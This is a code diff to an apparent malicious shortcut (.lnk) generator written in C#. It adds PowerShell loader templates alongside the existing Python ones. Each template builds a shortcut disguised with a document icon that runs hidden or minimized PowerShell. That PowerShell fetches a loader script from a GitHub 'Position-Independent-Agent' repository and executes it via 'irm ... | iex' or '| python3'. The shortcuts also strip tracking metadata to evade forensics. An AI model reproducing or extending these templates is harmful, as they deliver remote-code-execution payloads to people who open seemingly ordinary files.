@@ -708,13 +708,14 @@
         ConsoleData? Console = null, string? AppUserModelId = null,
         bool ForceNoLinkTrack = false, bool ForceNoLinkInfo = false);
 
-    private const string DefaultAgentLoaderUrl = "https://raw.githubusercontent.com/mrzaxaryan/Position-Independent-Agent/main/loaders/python/loader.py";
+    private const string DefaultPythonLoaderUrl = "https://raw.githubusercontent.com/mrzaxaryan/Position-Independent-Agent/main/loaders/python/loader.py";
+    private const string DefaultPowerShellLoaderUrl = "https://raw.githubusercontent.com/mrzaxaryan/Position-Independent-Agent/main/loaders/windows/powershell/loader.ps1";
 
     private static readonly LnkTemplate[] LnkTemplates =
     [
         new("Python Loader (Hidden)",
             @"C:\Windows\System32\conhost.exe",
-            $"--headless powershell.exe -NoP -C irm {DefaultAgentLoaderUrl} | python3",
+            $"--headless powershell.exe -NoP -C irm {DefaultPythonLoaderUrl} | python3",
             null, null,
             @"%SystemRoot%\system32\shell32.dll", 1,
             ShortcutWindowStyle.Minimized, false, "document",
@@ -722,7 +723,23 @@
 
         new("Python Loader (Visible)",
             @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
-            $"-NoP -C irm {DefaultAgentLoaderUrl} | python3",
+            $"-NoP -C irm {DefaultPythonLoaderUrl} | python3",
+            null, null,
+            @"%SystemRoot%\system32\shell32.dll", 1,
+            ShortcutWindowStyle.Minimized, false, "document",
+            ForceNoLinkTrack: true, ForceNoLinkInfo: true),
+
+        new("PowerShell Loader (Hidden)",
+            @"C:\Windows\System32\conhost.exe",
+            $"--headless powershell.exe -NoP -C irm {DefaultPowerShellLoaderUrl} | iex",
+            null, null,
+            @"%SystemRoot%\system32\shell32.dll", 1,
+            ShortcutWindowStyle.Minimized, false, "document",
+            ForceNoLinkTrack: true, ForceNoLinkInfo: true),
+
+        new("PowerShell Loader (Visible)",
+            @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+            $"-NoP -C irm {DefaultPowerShellLoaderUrl} | iex",
             null, null,
             @"%SystemRoot%\system32\shell32.dll", 1,
             ShortcutWindowStyle.Minimized, false, "document",
